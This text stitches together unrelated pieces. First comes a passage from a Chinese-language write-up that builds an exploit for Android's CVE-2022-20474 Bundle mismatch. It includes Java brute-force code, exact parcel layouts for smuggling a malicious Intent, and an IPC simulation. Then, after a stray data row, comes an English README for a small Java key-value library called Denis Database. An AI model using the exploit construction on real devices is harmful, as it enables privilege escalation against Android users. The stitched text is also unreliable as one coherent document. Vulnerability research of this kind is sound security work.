            object = readValue(type, loader, clazz, itemTypes);
        }
        return object;
    }
```

ÂèØ‰ª•ÁúãÂà∞ÁúüÊ≠£ÁöÑ`readValue`‰ºö‰ªé`mPosition`ÂºÄÂßãËØªÔºåÁÑ∂Âêé‰æùÊ¨°ËØªÂèñ`LazyType`Âíå`objectLength`ÔºåÁÑ∂ÂêéÂ∞±ËøõÂÖ•Ê≠£Â∏∏ÁöÑ`Value`ËØªÂèñÊµÅÁ®ã‰∫ÜÔºå‰æãÂ¶Ç`Parcelable`ÈúÄË¶ÅËØªÂèñ`ClassName`ÔºåÁÑ∂ÂêéÊâßË°å`createFromParcel`ÔºåËØªÂèñÂÆåÊàêÂêéÔºå‰∏éÊôÆÈÄöÁöÑ`Key-Value`Ê≤°Êúâ‰ªª‰ΩïÂå∫Âà´Ôºå‰πü‰∏ç‰ºöÂØπÂêéÁª≠ÁöÑÂ∫èÂàóÂåñ‰∫ßÁîüÂΩ±Âìç„ÄÇÂÜçÂ∫¶ÂõûÈ°æ‰∏Ä‰∏ãÔºå`Self-changed Bundle`ÁöÑÊ†∏ÂøÉÊÄùÊÉ≥ÊòØreadÂÆåÊàêÂêéÂÜç‰øÆÊîπÔºåËøôÈáåÂè™‰∏çËøáÊòØ‰∏Ä‰∏™ÊôÆÈÄöÁöÑË∂äÁïåËØªÂèñËÄåÂ∑≤ÔºåÁúãÊù•Ëøô‰∏™ÊñπÂêëË°å‰∏çÈÄö„ÄÇ

ÈÇ£‰πà`LazyValue`Âú®Ê≠§ËøáÁ®ã‰∏≠Ê≤°Êúâ`apply`Âë¢ÔºåÊç¢Ë®Ä‰πãÂ∞±‰ª•`LazyValue`ÁöÑË∫´‰ªΩÁªßÁª≠ÂèÇ‰∏éIPCÔºåÊ≠§Êó∂‰ºöË∞ÉÁî®ÂÖ∂`writeToParcel`ÂáΩÊï∞Ôºö

```java
     public void writeToParcel(Parcel out) {
            Parcel source = mSource;
            if (source != null) {
                synchronized (source) {
                    if (mSource != null) {
                        out.appendFrom(source, mPosition, mLength);
                        return;
                    }
                }
            }
            out.writeValue(mObject);
        }
```

Êï¥‰∏™`LazyValue`‰ºöÁõ¥Êé•Â§çÂà∂ËøáÂéªÔºåÈô§Èùû`mLength = 0`„ÄÇÁ≠âÁ≠âÔºÅ‰∏äÊñáÊèêÂà∞`mLength` = `objectLength` + 8Â≠óËäÇÔºåËÄå‰ªépatch‰ø°ÊÅØ‰∏≠ÂèØ‰ª•Áü•ÈÅìÔºåË¶ÅÊÉ≥Ëß¶ÂèëÊºèÊ¥û`objectLength`Â∫î‰∏∫-8ÔºåÈÇ£‰πàÊ≠§Êó∂`mLength = 0`Â∞±ÊàêÁ´ã‰∫Ü„ÄÇÊç¢Ë®Ä‰πãÔºåÂú®Ëøô‰∏™Âú∫ÊôØ‰∏ãÊï¥‰∏™`LazyValue`Â∞±Áõ¥Êé•Ê≤°‰∫ÜÔºåÂè™‰ºöÊã∑Ë¥ù`String Key`ÔºåËøôÊ†∑Â∞±ÈÄ†Êàê‰∫Ü‰∏Ä‰∏™Áº∫Â§±ÁöÑÂÜôÂÖ•Ôºå`Self-changed Bundle`ÁöÑÊù°‰ª∂Áõ¥Êé•Êª°Ë∂≥„ÄÇ

Áü•ÈÅì‰∫ÜÂéüÂõ†ÔºåÊàë‰ª¨Â∞±ËÉΩÂºÄÂßãÂ§çÁé∞‰∫ÜÔºå‰∏çËøáÂú®Ëøô‰πãÂâçÔºåÊàë‰ª¨ËøòÈúÄË¶Å‰∫øÁÇπÁÇπÁªÜËäÇ„ÄÇ

### ÁªÜËäÇ1 ‰∏§ÁßçÁ±ªÂûãÁöÑBundle

```java
 static final int BUNDLE_MAGIC = 0x4C444E42; // 'B' 'N' 'D' 'L'
 private static final int BUNDLE_MAGIC_NATIVE = 0x4C444E44; // 'B' 'N' 'D' 'N'
```

Êàë‰ª¨ÈÉΩÁü•ÈÅìÔºå`Bundle`ÁöÑÂÜÖÂ≠òÂ∏ÉÂ±Ä‰∏≠Â§ßËá¥Â¶Ç‰∏ãÊâÄÁ§∫Ôºö

```java
       /**
         *        |   4B   |   4B   |   4B   |
         * Bundle{| length |  MAGIC |  size  | Key  | Value | Key  | Value | ...}
         *
         */
```

`MAGIC`ÊòØBundleÂú®ÂÜÖÂ≠òÂ∏ÉÂ±Ä‰∏≠ÁöÑÈ≠îÊï∞ÔºåÂèØ‰ª•`BUNDLE_MAGIC`ÊàñËÄÖ`BUNDLE_MAGIC_NATIVE`ÔºåËøô‰∏§ËÄÖÊúÄÈáçË¶ÅÁöÑÂå∫Âà´ÊòØ`BUNDLE_MAGIC`‰ºöËÆ©`Key-Value`Âú®ÂèçÂ∫èÂàóÂåñÂÆåÊàêÂêéÔºåËøõË°åÈáçÊñ∞ÊéíÂ∫èÔºåÂ¶Ç‰ª•‰∏ã‰ª£Á†ÅÊâÄÁ§∫Ôºö

```java
 /**
     * Reads a map into {@code map}.
     *
     * @param sorted Whether the keys are sorted by their hashes, if so we use an optimized path.
     * @param lazy   Whether to populate the map with lazy {@link Function} objects for
     *               length-prefixed values. See {@link Parcel#readLazyValue(ClassLoader)} for more
     *               details.
     * @return a count of the lazy values in the map
     * @hide
     */
    int readArrayMap(ArrayMap<? super String, Object> map, int size, boolean sorted,
            boolean lazy, @Nullable ClassLoader loader) {
        int lazyValues = 0;
        while (size > 0) {
            String key = readString();
            Object value = (lazy) ? readLazyValue(loader) : readValue(loader);
            if (value instanceof LazyValue) {
                lazyValues++;
            }
            if (sorted) {
                map.append(key, value);
            } else {
                map.put(key, value);
            }
            size--;
        }
        if (sorted) {
            map.validate();
        }
        return lazyValues;
    }
```

`MAGIC`Ê†áÂøóÊúÄÁªà‰ºöÂΩ±ÂìçÂà∞`readArrayMap`‰∏≠ÁöÑ`sorted`ÁöÑÂÄºÔºå‰ªéËÄåÂºïÂèëÂØπmapËøõË°åÊéíÂ∫è„ÄÇÊ≥®Èáä‰∏≠‰πüÊèêÂà∞ÔºåÊéíÂ∫èÁöÑÊñπÂºè‰ºöÈÄöËøá`key String`ÁöÑhashÂÄº„ÄÇ

### ÁªÜËäÇ2 ÂèçÂ∫èÂàóÂåñ‰∏≠ÁöÑOverlap

       /**
         *                 a
         * ArrayMap{| Key1 | LazyValue1 | FakeKey2 | Value2 | Key3  | Value3 |} 
         *
         */

ËÆ©Êàë‰ª¨ÂÜçÂ∫¶ËØïÊÉ≥‰∏Ä‰∏ã`ArrayMap`ÁöÑËß£ÊûêÊµÅÁ®ã„ÄÇÂú®Á¨¨‰∏ÄËΩÆËß£ÊûêÁöÑÊó∂ÂÄô‰ºöÂÖàËß£Êûê`Key1`ÔºåÁÑ∂ÂêéÂ∞ùËØïËß£Êûê`LazyValue1`„ÄÇ‰ΩÜÊòØ`LazyValue1`ÁöÑ`objectLength`‰∏∫-8Ôºå`parcel`ÁöÑÊåáÈíà‰ºöÂõûÂà∞`LazyValue1`ÁöÑÂºÄÂ§¥ÔºåÂç≥aÁÇπÔºåËøôÂ∞±ÊòØÂú®‰∏äÊñá‰∏≠ÊèêÂà∞ÁöÑ**‰∫ãÂÆû4**ÔºåËá≥Ê≠§ÔºåÁ¨¨‰∏Ä‰∏™`Key-Map`Â∑≤ÁªèËß£ÊûêÂÆåÊØï„ÄÇÁ¨¨‰∫å‰∏™`Key-Value`ÊòØ‰ªéaÁÇπÂºÄÂßãËß£ÊûêÁöÑÔºåÊ≠§Êó∂‰ºöÂÖàËØªÂèñ`String`ÁöÑÈïøÂ∫¶ÔºåÂÅáËÆæ`LazyValue1`‰∏≠ÂåÖÂê´ÁöÑÊòØ`Parcelable`ÔºåÈÇ£‰πàËøô‰∏™ÈïøÂ∫¶Â∞±Â∫îËØ•ÊòØ4„ÄÇÂõ†Ê≠§ÔºåÁúüÊ≠£ÁöÑ`Key2`Â∫îËØ•ÊòØ‰ªéaÁÇπÂºÄÂßãÁöÑÔºåÂç≥ `Key2` = `LazyValue1` +` FakeKey2`„ÄÇ`LazyValue1`‰∏≠Ê≤°ÊúâÂåÖÂê´‰ªª‰ΩïÊï∞ÊçÆÔºåÊâÄ‰ª•ÈïøÂ∫¶ÊòØ`LazyType`+ `objectLength`ÁöÑ8‰∏™Â≠óËäÇÔºåÊï¥‰∏™`string`ÁöÑÈïøÂ∫¶Âàô‰∏∫4ÔºàÈïøÂ∫¶Ê†áËØÜÔºâ+ 4 * 2+ 4Ôºà""\0""Ôºâ= 16‰∏™Â≠óËäÇÔºåÈô§Âéª`LazyValue1`ÈáçÁÇπ8‰∏™Â≠óËäÇÔºåÊàë‰ª¨Âú®ÊûÑÈÄ†ÁöÑÊó∂ÂÄôËøòÈúÄË¶ÅÂú®ÂêéÈù¢Ë°•8‰∏™Â≠óËäÇÔºåÂç≥2‰∏™`writeInt`„ÄÇÁÑ∂ÂêéÊé•ÁùÄËØªÂèñ`Value2`„ÄÇÂõ†Ê≠§ÔºåÊàë‰ª¨Á¨¨‰∏ÄÊ¨°Ëß£ÊûêÁöÑÊó∂ÂÄôÔºåÈúÄË¶ÅÁî®‰∏Ä‰∏™`Key2-Value2`Êù•Â∫îÂØπËß£Êûê‰∏Ä‰∏™`objectLength`‰∏∫Ë¥üÊï∞ÁöÑ`LazyValue1`ËÄå‰∫ßÁîüÁöÑÊåáÈíàÂâçÁßªÁöÑÈóÆÈ¢òÔºåËÄåËøô‰∏™`Key2-Value2`ÁöÑÂÄºÊàë‰ª¨Âπ∂‰∏çÂÖ≥ÂøÉÔºåÂõ†‰∏∫ÂÆÉÂè™Âú®Á¨¨‰∏ÄÊ¨°Ëß£ÊûêÁöÑÊó∂ÂÄôÊâçÁî®Âà∞ÔºåÂè™ÊòØ‰∏Ä‰∏™Â∑•ÂÖ∑‰∫∫„ÄÇÊó¢ÁÑ∂ÊòØÁî®ÂÆåÂç≥‰∏¢ÁöÑÂ∑•ÂÖ∑‰∫∫ÔºåÈÇ£‰πàÁ¨¨‰∏ÄÊ¨°Ëß£ÊûêÂÆåÊàêÊàëÂ∏åÊúõÂÆÉËÉΩÂ§üÁ¶ªÊàë‰ª¨ÁöÑÂÖ≥ÈîÆÊï∞ÊçÆËøú‰∏ÄÁÇπÔºåËÄå‰∏î`Key3-Value3`‰∏≠ÊâçË£Ö‰∫ÜÊàë‰ª¨ÁöÑÊÅ∂ÊÑèÊï∞ÊçÆ„ÄÇÊúÄÂ•Ω`Key2`ÁöÑhashÂÄºËÉΩÂ§üÂ§ß‰∫é`Key1`ÔºåÈÇ£‰πàÂÆÉÂ∞±‰∏ç‰ºöÂΩ±ÂìçÂêéÁª≠ÁöÑËß£Êûê‰∫Ü„ÄÇÈÄöËøá**ÁªÜËäÇ1**ÔºåÊàë‰ª¨ÂèØ‰ª•ÈÄöËøáË∞ÉÊï¥`Key3`ÁöÑhashÂÄºÊù•ÂÆåÊàêËøô‰∏ÄÁõÆÊ†áÔºåÊàë‰ª¨Â∞ÜÂú®**ÁªÜËäÇ3**‰∏≠ËøõË°åËØ¶ÁªÜ‰ªãÁªç„ÄÇÁÑ∂ÂêéÊàë‰ª¨ËøõÂÖ•‰∫Ü`Key2-Value2`ÁöÑËß£ÊûêÔºå`Bundle mismatch`ËÄÅËßÑÁü©‰∫ÜÔºå`Value3`ÈáåÊîæ‰∏Ä‰∏™`ByteArray`Ë£ÖÊÅ∂ÊÑèÁöÑ`Intent`Âç≥ÂèØÔºå‰ΩÜÊòØ`Key3`ËøòÊúâ‰∏Ä‰∫õÈ¢ùÂ§ñÁöÑÈôêÂà∂„ÄÇÁ¨¨‰∏ÄËΩÆÂèçÂ∫èÂàóÂåñÂÆåÊàêÂêéÔºå`ArrayMap`ÁöÑÂ∏ÉÂ±ÄÂ∫îËØ•ÊòØËøôÊ†∑ÁöÑÔºåÂ∑•ÂÖ∑‰∫∫`Key2-Value2`Ë¢´‰∏¢Âú®‰∫ÜÊúÄÂêéÔºö

```
Key1-Value1 | Key3-Value3 | Key2-Value2
```

ËÄå‰∏äÊñá**ÂºÇÂ∏∏ÁöÑobjectLength**‰∏≠ÊèêÂà∞Ôºå`LazyValue1`ÁöÑÈïøÂ∫¶ÊòØ0ÔºåÊâÄ‰ª•Âú®`writeToParcel`ÁöÑÊó∂ÂÄôÔºåÊ†πÊú¨Â∞±Ê≤°Â§çÂà∂ËøáÂéªÔºÅ‰∫ãÂÆû‰∏äÁöÑÂ∏ÉÂ±ÄÊòØËøôÊ†∑ÁöÑÔºö

```
Key1 | Key3-Value3 | Key2-Value2
```

`Key1`ËØªÂèñÂÆå‰∫Ü‰πãÂêéËøòË¶ÅÂó∑Âó∑ÂæÖÂì∫ÂæóÂéªËØªÂèñ`Value1`ÔºåËøôÈáåÂèàÂèàÂèàÂèàË∂äÁïåËØªÂèñ‰∫ÜÔºå`Key3`ËøòÂæóÊâøÊãÖËµ∑ËØªÂèñ`LazyValue1`ÂæóÈáçÊãÖ„ÄÇ`Key3`‰∏≠Á¨¨‰∏Ä‰∏™`int`Êó¢Ë¶ÅÂÖÖÂΩì`String`ÈïøÂ∫¶ÁöÑËßíËâ≤ÔºåËøòË¶ÅÂÖÖÂΩì`LazyValue` `Type`ÁöÑËßíËâ≤ÔºåËøôÂ∞±‰ª£Ë°®‰∫Ü`Key3`ÁöÑÈïøÂ∫¶‰∏çËÉΩÂ§™Áü≠ÔºåÂ§™Áü≠‰∫Ühash‰∏çÂ•ΩÁÆó„ÄÇÁúã‰∫Ü‰∏ÄÁúº`LazyValue` `Type`ÁöÑÂàóË°®ÔºåÊàëÁúã‰∏≠‰∫Ü:

```java
private static final int VAL_LIST  = 11; // length-prefixed
```

ÂΩìÁÑ∂‰Ω†Ë¶ÅÈÄâ12„ÄÅ16„ÄÅ17‰πüË°åÔºåÂèçÊ≠£Âà´Â§™Áü≠Â∞±Ë°å„ÄÇ

ËÄå`Key3`‰∏≠Á¨¨‰∫å‰∏™`int`ËøòË¶ÅÂÖÖÂΩì`LazyValue`ÁöÑ`Length`ÔºåÈÄöËøáÂÆÉÔºåÊàë‰ª¨ÂèØ‰ª•ÊéßÂà∂`LazyValue1`ÁöÑÈïøÂ∫¶ÔºåÊää‰∏ã‰∏Ä‰∏™ÊåáÈíàÊåáÂà∞ÊÅ∂ÊÑè`Intent`ÁöÑÂºÄÂ§¥Â∞±Â•Ω‰∫Ü„ÄÇ‰Ω†Ë¶ÅËØ¥`LazyValue1`‰∏≠ÁöÑÂÜÖÂÆπ‰∏çÂêàÊ≥ïÔºüÈÇ£ÂíåÊàëÊ≤°ÂÖ≥Á≥ªÔºå‰Ω†Âè™Ë¶Å‰∏çË∞ÉÁî®`getXXX`Êù•`apply`ÂÆÉÔºåÈÇ£‰ªñÊ∞∏ËøúÈÉΩÊòØ`LazyValue`„ÄÇ

### ÁªÜËäÇ3 Êö¥Á†¥Âô®ÂÆûÁé∞

ÂÜô‰∏Ä‰∏™Êö¥Á†¥Âô®Âç≥ÂèØÔºö

```java
private static Pair<Integer, Integer> generateInt(){
        while (true) {
            Random random = new Random();
            int number1 = random.nextInt();
            int number2 = random.nextInt();
            Parcel parcel = Parcel.obtain();
            parcel.writeInt(11); //
            parcel.writeInt(32);
            parcel.writeInt(0);
            parcel.writeInt(0);
            parcel.writeInt(number1);
            parcel.writeInt(number2);
            parcel.writeInt(0);
            parcel.setDataPosition(0);
            String str = parcel.readString();
            if (str.hashCode() >= ""Cxxsheng"".hashCode() && str.hashCode() <  ""Cxxsheng"".hashCode() + 1000000)
            {
                parcel.recycle();
                return new Pair<>(number1, number2);
            }
            parcel.recycle();
        }
```

ÂΩìÁÑ∂ÔºåÊàë‰ª¨‰πüÂèØ‰ª•Êö¥ÂäõÁ†¥Ëß£`Key2`ÔºåÊääÂÆÉË∞ÉÊï¥Âà∞ÂâçÈù¢ÂéªÔºå‰ΩÜÊòØ`Key2`ÁöÑÈïøÂ∫¶ÊòØÂõ∫ÂÆöÁöÑ4ÔºåÊØîËæÉÁü≠ÔºåËÉΩÊìç‰ΩúÁöÑÁ©∫Èó¥Â∞ë‰∏Ä‰∫õÔºåËÄå`Key3`ÁöÑÈïøÂ∫¶Êàë‰ª¨Âú®‰∏äÊñáÂ∞±È¢ÑÁïô‰∫Ü‰∏Ä‰∫õÔºåËÆ©Êö¥Á†¥Ëµ∑Êù•ËΩªÊùæ‰∏Ä‰∫õ„ÄÇÂÅáËÆæÊàë‰ª¨ÁöÑ`Key1`ÊòØÂ≠óÁ¨¶‰∏≤`""Cxxsheng""`ÔºåÊàë‰ª¨Â∏åÊúõÊéßÂà∂`Key3`ÁöÑ`hash`ÂÄºËÉΩÊØî`""Cxxsheng""`ÁöÑ`hash`Â§ßÔºå‰ΩÜÂè™Â§ß‰∏ÄÁÇπÁÇπÔºåÊàëËÆæÁΩÆ‰∫Ü1000000ÔºåÈÇ£Ê†∑ÂÆÉ‰ª¨Â∞±ËÉΩÂ§üÊúâËæÉÂ§ßÁöÑÊ¶ÇÁéáÊ∞∏ËøúÂú®‰∏ÄËµ∑‰∫ÜÔºåÁ¨¨‰∏âËÄÖ`Key2`Â∞±Êó†Ê≥ïÊèíË∂≥‰∫Ü„ÄÇ‰∏äÊñáÊèêÂà∞ËøáÔºå`string`ÁöÑÂâç‰∏§‰∏™`int`ÊòØÂõ∫ÂÆöÁöÑ„ÄÇÂõ†Ê≠§Êàë‰ª¨ÂÖàÂÜôÂÖ•`VAL_LIST `Ôºà‰πüÊòØ`String`ÈïøÂ∫¶ÔºâÔºåÈÄöËøáËÆ°ÁÆóÂæóÂá∫Á¶ªÊÅ∂ÊÑèÁöÑIntentËøòÂ∑Æ32‰∏™Â≠óËäÇÔºåÂâ©‰∏ãÁöÑÂá†‰∏™0ÈÉΩÂèØ‰ª•Áî®Êù•ÁàÜÁ†¥‰∫Ü„ÄÇÈöè‰æøÈÄâ‰∫Ü2‰∏™ÁàÜÁ†¥Âç≥ÂèØ„ÄÇ

### Â§çÁé∞

| ÂÄº              | ËØ¥Êòé                                                         |
| --------------- | ------------------------------------------------------------ |
| ""Cxxsheng""      | Á¨¨‰∏Ä‰∏™key                                                    |
| 4               | ‰ºöËØªÂèñ‰∏§ËΩÆÔºöÁ¨¨‰∏ÄËΩÆ‰ª£Ë°®`VAL_PARCELABLE`ÔºõÁ¨¨‰∫åËΩÆÂèòÊàêÁ¨¨‰∫å‰∏™KeyÁöÑString Length |
| -8              | ‰ºöËØªÂèñ‰∏§ËΩÆÔºöÁ¨¨‰∏ÄËΩÆ‰ª£Ë°®`LazyValue`ÁöÑ`objectLength`Ôºå‰ºöÂØºËá¥ËØªÂèñÊåáÈíàÂâçÁßªÔºåÂØºËá¥‰∏§ËΩÆËØªÂèñÔºõÁ¨¨‰∫åËΩÆÂèòÊàêÁ¨¨‰∫å‰∏™Key ÁöÑString Value |
| 0               | Á¨¨‰∫å‰∏™Key ÁöÑString Value                                     |
| 0               | Á¨¨‰∫å‰∏™Key ÁöÑString Value                                     |
| 1               | `VAL_INTEGER`                                                |
| 0               | Á¨¨‰∫å‰∏™Value                                                  |
| 11              | Á¨¨‰∏â‰∏™KeyÁöÑString Length                                     |
| 32              | Á¨¨‰∏â‰∏™KeyÁöÑString Value                                      |
| 0               | Á¨¨‰∏â‰∏™KeyÁöÑString Value                                      |
| 0               | Á¨¨‰∏â‰∏™KeyÁöÑString Value                                      |
| number1         | Á¨¨‰∏â‰∏™KeyÁöÑString ValueÔºåËøô‰∏§‰∏™ÂÄºÁî®‰∫éË∞ÉÊï¥ÊéíÂ∫è                |
| number2         | Á¨¨‰∏â‰∏™KeyÁöÑString ValueÔºåËøô‰∏§‰∏™ÂÄºÁî®‰∫éË∞ÉÊï¥ÊéíÂ∫è                |
| 0               | Á¨¨‰∏â‰∏™KeyÁöÑString Value                                      |
| 13              | `VAL_BYTEARRAY`                                              |
| LazyValueÁöÑÈïøÂ∫¶ | ËÆ°ÁÆóÂæóÂá∫                                                     |
| ByteArrayÁöÑÈïøÂ∫¶ | ËÆ°ÁÆóÂæóÂá∫                                                     |
| ByteArray       | ÂÖ∂‰∏≠ÂåÖÂê´‰∫Ü‰∫ÜÊÅ∂ÊÑèÁöÑKey-ValueÔºåÂç≥`Intent.EXTRA_INTENT`ÂíåÂÖ∂Intent |

ÂèØ‰ª•ÈÄöËøá`number1`Âíå`numbder2`Êù•Êìç‰ΩúÁ¨¨‰∏â‰∏™ÂÄºÂú®`ArrayMap`‰∏≠ÁöÑÊéíÂ∫è„ÄÇÂõ†‰∏∫`ArrayMap`ÊòØ‰æùÊçÆ`key`ÁöÑ`hashcode`Êù•ÊéíÂ∫èÁöÑÔºåËøôÊ†∑ÂèØ‰ª•ËÆ©Á¨¨‰∏â‰∏™ÁöÑÂÄºÂú®ÂèçÂ∫èÂàóÂåñÂêéÂèòÊàêÁ¨¨‰∫å‰∏™ÔºåÁ¥ßË∑üÂú®Á¨¨‰∏Ä‰∏™""Cxxsheng""ÁöÑÂêéÈù¢ÔºåÂ¶Ç‰∏ãÊâÄÁ§∫Ôºö

```txt
Bundle[{Cxxsheng=Supplier{VAL_PARCELABLE@28+0},[‰∏ÄÊÆµ‰π±Á†Å]=[ÊÅ∂ÊÑèÁöÑByteArray], [‰∏ÄÊÆµ‰π±Á†Å]=0}]
```

ÂèØ‰ª•ÁúãÂà∞Êàë‰ª¨ËØªÂèñÁöÑÈ°∫Â∫è‰πü‰ºöÂíåÂÜôÂÖ•ÁöÑÈ°∫Â∫è‰∏ç‰∏ÄÊ†∑„ÄÇÂú®ÂÆåÊàêÂÜôÂÖ•ÂêéÔºå‰∏äÊñáÊàë‰ª¨ÂàÜÊûêËøá‰∏ÄÊï¥‰∏™`LazyValue`ÈÉΩË¢´‰∏¢‰∫ÜÔºåËÄåÁ¨¨‰∏â‰∏™`Key-Value`Ë¢´ÈáçÊñ∞ÊéíÂ∫èÂà∞Á¨¨‰∫å‰∏™ÔºåÂÖ∂‰∏≠‰πüÂåÖÊã¨`type`Âíå`objectLength`ÔºåÂõ†Ê≠§ÔºåÈ°µÈù¢Â∏ÉÂ±ÄÂ∞ÜÂèòÊàêÂ¶Ç‰∏ãÊâÄÁ§∫Ôºö

| ÂÄº                                  | ËØ¥Êòé                                                         |
| :---------------------------------- | :----------------------------------------------------------- |
| ""Cxxsheng""                          | Á¨¨‰∏Ä‰∏™key                                                    |
| 11                                  | VAL_LIST                                                     |
| 32                                  | Á¨¨‰∏Ä‰∏™ValueÁöÑÈïøÂ∫¶ÔºåÂêéÈù¢ÁöÑÂêà‰∏çÂêàÊ≥ïÂ∑≤ÁªèÈÉΩ‰∏çÈáçË¶ÅÔºàÂèçÊ≠£‰∏ç‰ºöÂéªapplyËøô‰∏™LazyValueÔºâÔºåËøô‰∏™Áõ¥Êé•ÊåáÂà∞ByteArray‰∏≠ÊÅ∂ÊÑèIntentÁöÑÂâçÈù¢ |
| 0                                   | LazyValue‰∏≠ÁöÑÂÄº                                              |
| 0                                   | LazyValue‰∏≠ÁöÑÂÄº                                              |
| number1                             | LazyValue‰∏≠ÁöÑÂÄº                                              |
| number2                             | LazyValue‰∏≠ÁöÑÂÄº                                              |
| 0                                   | LazyValue‰∏≠ÁöÑÂÄº                                              |
| 13                                  | LazyValue‰∏≠ÁöÑÂÄº                                              |
| LazyValueÁöÑÈïøÂ∫¶                     | LazyValue‰∏≠ÁöÑÂÄº                                              |
| ByteArrayÁöÑÈïøÂ∫¶                     | LazyValue‰∏≠ÁöÑÂÄº                                              |
| ByteArrayÂºÄÂßã/`Intent.EXTRA_INTENT` | Á¨¨‰∫å‰∏™Key                                                    |
| Intent                              | Á¨¨‰∫å‰∏™Value                                                  |
| Á¨¨‰∏â‰∏™Key-Value                     | Ë¢´ÊéíÂà∞‰∫ÜÊúÄÂêé                                                 |

### Âà©Áî®

ËØªËÄÖÂèØ‰ª•Ëá™Ë°åÂà©Áî®ÁªèÂÖ∏ÁöÑ`AccountManagerService`Âà©Áî®ÈìæÔºåËá≥‰∫éËÉΩÂê¶Âà©Áî®Êú¨Êñá‰∏çÂÜçÂ§öÂÅöËµòËø∞ÔºåÂõ†‰∏∫ËøôÂèñÂÜ≥‰∫é2022Âπ¥11Êúà‰ªΩÁöÑË°•‰∏Å‰∏≠ÊúâÊ≤°Êúâ`checkKeyIntentParceledCorrectly`ÂáΩÊï∞„ÄÇÂú®Ê≠§È¢ùÂ§ñËß£Èáä‰∏Ä‰∏ãÔºåËØ•ÂáΩÊï∞Âà©Áî®‰∫ÜÊ®°ÊãüIPCÁöÑË∞ÉÁî®ÊµÅÁ®ãÔºåÊù•ÈòªÊñ≠‰∫Ü`AccountManagerService`Âà©Áî®Èìæ„ÄÇÂõ†Ê≠§ÔºåÂú®Android 12ÊàñËÄÖ13‰∏äÂç≥‰ΩøÂ≠òÂú®MismatchÔºå‰πüÊú™ÂøÖÂèØ‰ª•Âà©Áî®ÊàêÂäüÔºåÈúÄË¶ÅÂØªÊâæbypassËØ•ÂáΩÊï∞ÁöÑÊñπÊ≥ï„ÄÇ

Êàë‰ª¨ÂèØ‰ª•‰ªøÂÜô‰∏Ä‰∏ãËøô‰∏™ÂáΩÊï∞ÔºåÊù•Ê®°ÊãüIPCË∞ÉÁî®ÊµÅÁ®ãÂ¶Ç‰∏ãÔºö

```java
    private Bundle simulateIPCBundle(Bundle originBundle){
        Parcel p = Parcel.obtain();
        p.writeBundle(originBundle);
        p.setDataPosition(0);
        byte[] bs = p.marshall(); //debugÁöÑÊó∂ÂÄôËøôÈáåÂèØ‰ª•Âú®ËøôÈáåÁúãÂà∞parcelÊï∞ÊçÆ
        // marshall‰∏ç‰ºöÊîπÂèòParcelÊåáÈíà
        // p.setDataPosition(0); 
        Bundle simulateBundle = p.readBundle(getClass().getClassLoader());
        p.recycle();
        return simulateBundle;
    }
```

ÁÑ∂ÂêéÊ¨£Ëµè‰∏Ä‰∏ãÈÄöËøáÊ®°ÊãüIPCË∞ÉÁî®ÊµÅÁ®ãÁöÑÊó•ÂøóËæìÂá∫ÂõæÔºåÂÖ∑‰ΩìÂèØ‰ª•ÂèÇËÄÉÊàëÁöÑ[Github‰ª£Á†Å](https://github.com/cxxsheng/CVE-2022-20474)Ôºö
![description](https://raw.githubusercontent.com/cxxsheng/CVE-2022-20474/refs/heads/main/img.png)

",0,0,1,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,2.0
hacimertgokhan/denis,master,"# Denis Database

Denis Database is a Java Library that works with Redis logic and has a simple structure. It provides ease of access and manipulation of temporary data by storing operations in the cache. It increases database categorization with action statuses, providing ease of development.

## DAPI

---
Detailed library information about DDB.

# Actions

---

## actString Class

**`actString`** is a class designed to manage data with a `String key` and `String value` pair. This class is used for basic CRUD operations and checking data existence.

---

### **Methods**
| Method                   | Return Type | Description |
|-------------------------|-------------|-------------|
| `set(String key, String value)` | `Void`      | Saves or updates the specified key and value. |
| `get(String key)`     | `String`    | Returns the value corresponding to the given key. Returns `null` if no value exists. |
| `del(String key)`     | `Void`      | Deletes the specified key and its value. |
| `exists(String key)`  | `Boolean`   | Checks whether the given key exists. |

---

### **Usage Example**
```java
actString actstr = new actString();

// Adding data
actstr.set(""key1"", ""value1"");

// Retrieving data
String value = actstr.get(""key1""); // ""value1""

// Data check
boolean exists = actstr.exists(""key1""); // true

// Deleting data
actstr.del(""key1"");
```

---

## actListrig Class

**`actListrig`** is a structure that associates a `List<String>` key with a `String` value. It is created using `ConcurrentHashMap`, which is suitable for parallel operations.

---

### **Methods**
| Method                     | Return Type         | Description |
|----------------------------|---------------------|-------------|
| `set(List<String> key, String value)` | `Void`            | Saves or updates the specified list key and value pair. |
| `get(List<String> key)`   | `String`          | Returns the value corresponding to the given list key. Returns `""null""` if no value exists. |
| `del(List<String> key)`   | `Void`            | Deletes the specified list key and its value. |
| `exists(String key)`      | `Boolean`         | Checks whether the given list key exists. |
| `getStore()`              | `ConcurrentHashMap` | Returns all data. |

---

### **Usage Example**
```java
import java.util.Arrays;
import java.util.List;

actListrig actlist = new actListrig();

// Create key
List<String> key = Arrays.asList(""item1"", ""item2"");

// Add data
actlist.set(key, ""value1"");

// Retrieve data
String value = actlist.get(key); // ""value1""

// Data check
boolean exists = actlist.getStore().containsKey(key); // true

// Delete data
actlist.del(key);
```

---

## Class Differences and Usage Scenarios

| Feature         | actString                        | actListrig                           |
|-----------------|----------------------------------|--------------------------------------|
| **Key Type**    | `String`                        | `List<String>`                      |
| **Data Management**| Single key-value pair    | Managing multiple keys together     |
| **Use Case**    | Managing simple structures       | Managing complex, hierarchical structures |

**Example Scenarios:**
- **`actString`** can be used to store username-password pairs in a database.
- **`actListrig`** can be used to associate product categories and subcategories on an e-commerce site.

---

## actStrist Class

`actStrist` is a class that associates a `String` key with a `List<String>` value. It uses the `ConcurrentHashMap` infrastructure suitable for parallel operations. This class is designed to bind multiple values to a single key.

### Methods

| Method                             | Return Type             | Description                                                |
|------------------------------------|-------------------------|-------------------------------------------------------------|
| `set(String key, List<String> value)` | `Void`               | Saves or updates the specified key and value list. |
| `get(String key)`                 | `List<String>`         | Returns the value list corresponding to the given key. Returns `[""null""]` if no value exists. |
| `del(String key)`                 | `Void`                | Deletes the specified key and its value list.          |
| `exists(String key)`              | `Boolean`             | Checks whether the given key exists. |
| `getStore()`                      | `ConcurrentHashMap`   | Returns all data.                                   |

### Usage Example

```java
actStrist actstrist = new actStrist();

// Create key and value list
String key = ""group1"";
List<String> values = Arrays.asList(""item1"", ""item2"", ""item3"");

// Add data
actstrist.set(key, values);

// Retrieve data
List<String> retrievedValues = actstrist.get(key);
System.out.println(retrievedValues); // [item1, item2, item3]

// Data check
boolean exists = actstrist.exists(key);
System.out.println(exists); // true

// Delete data
actstrist.del(key);

// Check again
exists = actstrist.exists(key);
System.out.println(exists); // false
```
